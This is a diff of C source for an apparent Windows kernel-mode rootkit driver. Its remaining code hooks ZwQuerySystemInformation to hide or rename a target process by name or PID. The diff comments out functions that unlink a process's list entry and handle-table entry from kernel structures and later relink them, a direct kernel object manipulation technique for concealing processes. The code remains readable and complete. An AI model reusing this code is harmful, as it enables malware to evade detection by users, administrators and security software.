@@ -40,7 +40,7 @@ NTSTATUS HookZwQuerySystemInformation(
 					currentProcInfo = (SYSTEM_PROCESS*)SystemInformation;
 					while (currentProcInfo->NextEntryDelta) {
 						if (currentProcInfo->ProcessName.Length) {							
-							if (!wcscmp(currentProcInfo->ProcessName.Buffer, (const wchar_t*)targetName) || currentProcInfo->ProcessId == TARGET_PID) {
+							if (!wcscmp(currentProcInfo->ProcessName.Buffer, (const wchar_t*)targetName) || currentProcInfo->ProcessId == (HANDLE)TARGET_PID) {
 								if (isFirstProc) {
 									newNameAddr = (PWCHAR)((PCHAR)SystemInformation + *ReturnLength + 5);
 									RtlCopyMemory(newNameAddr, NEW_NAME, sizeof(NEW_NAME));
@@ -64,127 +64,127 @@ NTSTATUS HookZwQuerySystemInformation(
 	return retStatus;
 }
 
-void DeleteFromProcessListByName(PCHAR TargetImageName){
-	PLIST_ENTRY currentEntry;
-	ULONG	process;
-	
-	currentEntry = PsActiveProcessHead->Flink;
-	do{
-		process = GET_PROCESS_BY_LIST_ENTRY(currentEntry);
-		if(!strcmp(TargetImageName, PsGetProcessImageFileName(process))){
-			DbgPrint("Find Target proc : %s\nAddr : 0x%08X\n", PsGetProcessImageFileName(process), process);
-			//DbgBreakPoint();
-			DeleteFromProcessList(currentEntry, process);			
-			break;
-		}
-		currentEntry = currentEntry->Flink;
-	}while(currentEntry != PsActiveProcessHead);
-}
-
-//----------------------------------------
-
-void DeleteFromProcessListByPid(ULONG TargetPid){
-	PLIST_ENTRY currentEntry;
-	ULONG	process;
-	
-	currentEntry = PsActiveProcessHead->Flink;
-	do{
-		process = GET_PROCESS_BY_LIST_ENTRY(currentEntry);
-		if(TargetPid == (ULONG)PsGetProcessId((PEPROCESS)process)){
-			DbgPrint("Find Target proc : %d\nAddr : 0x%08X\n", PsGetProcessId((PEPROCESS)process), process);
-			//DbgBreakPoint();
-			DeleteFromProcessList(currentEntry, process);			
-			break;
-		}
-		currentEntry = currentEntry->Flink;
-	}while(currentEntry != PsActiveProcessHead);
-}
-
-//----------------------------------------
-
-void DeleteFromProcessList(PLIST_ENTRY targetListEntry, ULONG targetProcess){
-	ULONG	handleTableAddr;
-
-	glTargetProcess = targetProcess;
-	DeleteEntryFromList(targetListEntry);
-	handleTableAddr = *GET_HANDLE_TABLE(targetProcess);
-	DbgPrint("HANDLE_TABLE: 0x%08X\n", handleTableAddr); 
-	if(handleTableAddr){
-		glTargetHandleTable = handleTableAddr;
-		DeleteEntryFromList(GET_HANDLE_TABLE_LIST_ENTRY(handleTableAddr));
-	}
-}
-
-//----------------------------------------
-
-void DeleteEntryFromList(PLIST_ENTRY TargetEntry){
-	PLIST_ENTRY nextEntry;
-	PLIST_ENTRY prevEntry;
-
-	prevEntry = TargetEntry->Blink;
-	nextEntry = TargetEntry->Flink;
-
-	prevEntry->Flink = nextEntry;
-	nextEntry->Blink = prevEntry;
-}
-
-
-//----------------------------------------
-
-void InsertProcessEntry(){
-	PLIST_ENTRY currentEntry;
-	
-	//DbgBreakPoint();
-	currentEntry = PsActiveProcessHead;
-	if(!wcscmp(TARGET_NAME, L"System")) {
-		if(glTargetHandleTable){
-			InsertEntryInList(PsActiveProcessHead, GET_ENTRY_PROCESS_LIST(glTargetProcess));
-			InsertEntryInList(PsActiveHandleTableHead, GET_HANDLE_TABLE_LIST_ENTRY(glTargetHandleTable));
-		}
-	}
-	else {
-		InsertEntryInList(PsActiveProcessHead->Blink, GET_ENTRY_PROCESS_LIST(glTargetProcess));
-		if(glTargetHandleTable){
-			InsertEntryInList(PsActiveHandleTableHead->Blink, GET_HANDLE_TABLE_LIST_ENTRY(glTargetHandleTable));
-		}
-	}
-}
-
-//----------------------------------------
-
-void InsertEntryInList(PLIST_ENTRY prevTargetEntry, PLIST_ENTRY TargetEntry){
-	PLIST_ENTRY nextEntry;
-
-	nextEntry = prevTargetEntry->Flink;
-	prevTargetEntry->Flink = TargetEntry;
-	nextEntry->Blink = TargetEntry;
-
-	TargetEntry->Blink = prevTargetEntry;
-	TargetEntry->Flink = nextEntry;
-}
-
-//----------------------------------------
+//void DeleteFromProcessListByName(PCHAR TargetImageName){
+//	PLIST_ENTRY currentEntry;
+//	SIZE_T	process;
+//	
+//	currentEntry = PsActiveProcessHead->Flink;
+//	do{
+//		process = GET_PROCESS_BY_LIST_ENTRY(currentEntry);
+//		if(!strcmp(TargetImageName, PsGetProcessImageFileName(process))){
+//			DbgPrint("Find Target proc : %s\nAddr : 0x%08X\n", PsGetProcessImageFileName(process), process);
+//			//DbgBreakPoint();
+//			DeleteFromProcessList(currentEntry, process);			
+//			break;
+//		}
+//		currentEntry = currentEntry->Flink;
+//	}while(currentEntry != PsActiveProcessHead);
+//}
 //
-// Выводит минимальную информацию о процессе process
+////----------------------------------------
 //
-void InfoProcess(ULONG process){
-
-	char name[20];
-	HANDLE_T pid;
-
-    // имя процесса
-    RtlCopyMemory(name,PsGetProcessImageFileName(process),16);
-    name[16] = 0;
-
-    // идентификатор процесса
-    pid = PsGetProcessId((PEPROCESS_T)process);
-
-    // выводим информацию
-    DbgPrint("Process %p:\n",process);
-    DbgPrint("%d   %s\n\n",pid,name);
-
-    return;
-}
+//void DeleteFromProcessListByPid(ULONG TargetPid){
+//	PLIST_ENTRY currentEntry;
+//	SIZE_T	process;
+//	
+//	currentEntry = PsActiveProcessHead->Flink;
+//	do{
+//		process = GET_PROCESS_BY_LIST_ENTRY(currentEntry);
+//		if(TargetPid == (SIZE_T)PsGetProcessId((PEPROCESS)process)){
+//			DbgPrint("Find Target proc : %d\nAddr : 0x%08X\n", PsGetProcessId((PEPROCESS)process), process);
+//			//DbgBreakPoint();
+//			DeleteFromProcessList(currentEntry, process);			
+//			break;
+//		}
+//		currentEntry = currentEntry->Flink;
+//	}while(currentEntry != PsActiveProcessHead);
+//}
+//
+////----------------------------------------
+//
+//void DeleteFromProcessList(PLIST_ENTRY targetListEntry, ULONG targetProcess){
+//	SIZE_T	handleTableAddr;
+//
+//	glTargetProcess = targetProcess;
+//	DeleteEntryFromList(targetListEntry);
+//	handleTableAddr = *GET_HANDLE_TABLE(targetProcess);
+//	DbgPrint("HANDLE_TABLE: 0x%08X\n", handleTableAddr); 
+//	if(handleTableAddr){
+//		glTargetHandleTable = handleTableAddr;
+//		DeleteEntryFromList(GET_HANDLE_TABLE_LIST_ENTRY(handleTableAddr));
+//	}
+//}
+//
+////----------------------------------------
+//
+//void DeleteEntryFromList(PLIST_ENTRY TargetEntry){
+//	PLIST_ENTRY nextEntry;
+//	PLIST_ENTRY prevEntry;
+//
+//	prevEntry = TargetEntry->Blink;
+//	nextEntry = TargetEntry->Flink;
+//
+//	prevEntry->Flink = nextEntry;
+//	nextEntry->Blink = prevEntry;
+//}
+//
+//
+////----------------------------------------
+//
+//void InsertProcessEntry(){
+//	PLIST_ENTRY currentEntry;
+//	
+//	//DbgBreakPoint();
+//	currentEntry = PsActiveProcessHead;
+//	if(!wcscmp(TARGET_NAME, L"System")) {
+//		if(glTargetHandleTable){
+//			InsertEntryInList(PsActiveProcessHead, GET_ENTRY_PROCESS_LIST(glTargetProcess));
+//			InsertEntryInList(PsActiveHandleTableHead, GET_HANDLE_TABLE_LIST_ENTRY(glTargetHandleTable));
+//		}
+//	}
+//	else {
+//		InsertEntryInList(PsActiveProcessHead->Blink, GET_ENTRY_PROCESS_LIST(glTargetProcess));
+//		if(glTargetHandleTable){
+//			InsertEntryInList(PsActiveHandleTableHead->Blink, GET_HANDLE_TABLE_LIST_ENTRY(glTargetHandleTable));
+//		}
+//	}
+//}
+//
+////----------------------------------------
+//
+//void InsertEntryInList(PLIST_ENTRY prevTargetEntry, PLIST_ENTRY TargetEntry){
+//	PLIST_ENTRY nextEntry;
+//
+//	nextEntry = prevTargetEntry->Flink;
+//	prevTargetEntry->Flink = TargetEntry;
+//	nextEntry->Blink = TargetEntry;
+//
+//	TargetEntry->Blink = prevTargetEntry;
+//	TargetEntry->Flink = nextEntry;
+//}
+//
+////----------------------------------------
+////
+//// Выводит минимальную информацию о процессе process
+////
+//void InfoProcess(ULONG process){
+//
+//	char name[20];
+//	HANDLE_T pid;
+//
+//    // имя процесса
+//    RtlCopyMemory(name,PsGetProcessImageFileName(process),16);
+//    name[16] = 0;
+//
+//    // идентификатор процесса
+//    pid = PsGetProcessId((PEPROCESS_T)process);
+//
+//    // выводим информацию
+//    DbgPrint("Process %p:\n",process);
+//    DbgPrint("%d   %s\n\n",pid,name);
+//
+//    return;
+//}
 
 //----------------------------------------
 
